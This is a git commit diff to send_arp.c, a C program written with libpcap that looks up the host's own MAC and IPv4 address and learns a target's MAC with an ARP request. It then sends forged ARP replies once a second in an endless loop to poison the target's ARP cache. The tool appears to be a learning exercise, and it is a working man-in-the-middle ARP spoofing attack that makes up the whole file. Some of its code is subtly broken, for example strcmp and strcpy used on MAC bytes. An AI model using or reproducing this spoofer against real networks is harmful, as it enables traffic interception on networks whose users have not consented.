dbf6e1988f65fc2a6ff67874b1ab9869798947b9
ppagari <shwo8713@gmail.com>
2017-07-30 22:27:11 -0700

    add get ipv4 / send arp spoofing

--- send_arp.c
+++ send_arp.c
@@ -13,10 +13,10 @@
 struct _ether_header{
   	unsigned char ether_dhost[ETH_ALEN];	
   	unsigned char ether_shost[ETH_ALEN];
- 	short ether_type;		        
+ 	short int ether_type;		        
 };
 
-struct arp_header{
+struct _arp_header{
 	unsigned short int HW_type;
 	unsigned short int PT_type;
     unsigned char HW_size;
@@ -30,15 +30,16 @@ struct arp_header{
 
 u_char global_mac[6];
 
-void make_arp(u_char* packet,char *dest_mac,in_addr_t dest_ip,char *source_mac,in_addr_t source_ip,int opcode){
-	int ether_arp = 0x0608;
+void make_arp(char *packet, char *dest_mac, in_addr_t dest_ip, char *source_mac, in_addr_t source_ip,int opcode){
+	unsigned short int ether_arp = 0x0608;
 	int arp_proto = 0x0008;
 	int HW_eth = 0x0100;
 	int HW_size = 0x06;
 	int PT_size = 0x04;
 	int i;
-	memset(packet,0x00,1000);
 
+	memset(packet,0x00,42);
+	
 	memcpy(packet,dest_mac,6);
 	memcpy(packet+6,source_mac,6);
 	memcpy(packet+12,&(ether_arp),2);
@@ -52,7 +53,6 @@ void make_arp(u_char* packet,char *dest_mac,in_addr_t dest_ip,char *source_mac,i
 	if(strcmp(dest_mac,global_mac))
 		memcpy(packet+32,dest_mac,6);
 	memcpy(packet+38,&(dest_ip),4);
-
 }
 
 void print_packet(const u_char *packet_data){
@@ -72,25 +72,26 @@ int main(int argc,char *argv[]){
 	u_int32_t packet_rev;
 	const u_char *packet_data = 0;
 	struct pcap_pkthdr *header;
-	u_char packet[1000];
-	struct arp_header *ah;
+	
+	char arp_packet[42];
+
+	struct _arp_header *ah;
 	struct _ether_header *eh;
 	struct bpf_program fp;
 	bpf_u_int32 mask;
 	bpf_u_int32 net;
 	pcap_t *handle;
 
-	struct ifreq s;
+	struct ifreq _socket;
 
 	struct in_addr my_addr;
 	struct in_addr send_addr;
 	struct in_addr tar_addr;	
-	char my_mac[6];
-	char target_mac[6];
-
+	u_char my_mac[6];
+	u_char target_mac[6];
 
 	char *dev;
-	int fd,i;
+	int fd;
 
 	if(argc < 3){
 		printf("[*] plz input : ./send_arp sender_ip target_ip\n");
@@ -100,53 +101,63 @@ int main(int argc,char *argv[]){
 	dev = argv[1];
 	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
-		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		fprintf(stderr, "[*] Couldn't open device %s: %s\n", dev, errbuf);
 		return(2);
 	}	
     if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+        fprintf(stderr, "[*] Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
         return(2);
     }
     if (pcap_setfilter(handle, &fp) == -1) {
-        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+        fprintf(stderr, "[*] Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
         return(2);
     }
-    	
-	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
-	strcpy(s.ifr_name, argv[1]);
-	if (ioctl(fd, SIOCGIFHWADDR, &s) != 0 ){
-		fprintf(stderr, "error\n");
+	// get my mac address    	
+	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP); 
+	_socket.ifr_addr.sa_family = AF_INET;
+	strcpy(_socket.ifr_name, dev);
+	if (ioctl(fd, SIOCGIFHWADDR, &_socket) != 0 ){
+		fprintf(stderr, "[*] Error. Bye.\n");
 		return 0;
 	}
-
-	memcpy(my_mac,s.ifr_addr.sa_data,6);
+	close(fd);
+	memcpy(my_mac,_socket.ifr_addr.sa_data,6);
 	memset(global_mac,0xFF,6);
-	memset(packet,0x00,1000);
 
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    _socket.ifr_addr.sa_family = AF_INET;
+    strncpy(_socket.ifr_name,dev,IFNAMSIZ-1); 
+    ioctl(fd, SIOCGIFADDR, &_socket);
+    close(fd);
+
+    my_addr = ((struct sockaddr_in *)&_socket.ifr_addr)->sin_addr;    
 	inet_pton(AF_INET, argv[2], &send_addr.s_addr);
 	inet_pton(AF_INET, argv[3], &tar_addr.s_addr);
-	
-	make_arp(packet,global_mac,tar_addr.s_addr,my_mac,my_addr.s_addr,0x0100);
-	pcap_sendpacket(handle,packet,42);
 
+	make_arp(arp_packet,global_mac,tar_addr.s_addr,my_mac,my_addr.s_addr,0x0100);
+	pcap_sendpacket(handle,(char *)arp_packet,42);
 	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	packet_rev = pcap_next_ex(handle, &header, &packet_data);		
 
-	eh = (struct _ether_header*)(packet_data);
-	ah = (struct arp_header*)(packet_data+14);
-	if(ntohs(eh->ether_type) == ETHERTYPE_ARP){
-		memcpy(target_mac,eh+6,6);
-		print_packet(packet_data);
+	while(1){
+		packet_rev = pcap_next_ex(handle, &header, &packet_data);		
+		if(packet_rev == 1){
+			eh = (struct _ether_header*)(packet_data);
+			ah = (struct _arp_header*)(packet_data +14);
+			if(ntohs(eh->ether_type) == ETHERTYPE_ARP && !(strcmp(my_mac,eh->ether_dhost))){
+				strcpy(target_mac,eh->ether_shost);
+				break;
+			}
+		}
 	}
 
-	make_arp(packet,target_mac,tar_addr.s_addr,my_mac,send_addr.s_addr,0x0200);
+	make_arp(arp_packet, target_mac, tar_addr.s_addr, my_mac, send_addr.s_addr,0x0200);
 	while(1){
-		pcap_sendpacket(handle,packet,42);
-		printf("[*] send modified arp packet\n")
+		pcap_sendpacket(handle,arp_packet,42);
+		printf("[*] send modified arp packet\n");
 		sleep(1);
 	}
-
+	
 }
 
 // mac : 00:0c:29:62:3b:43 , ens33
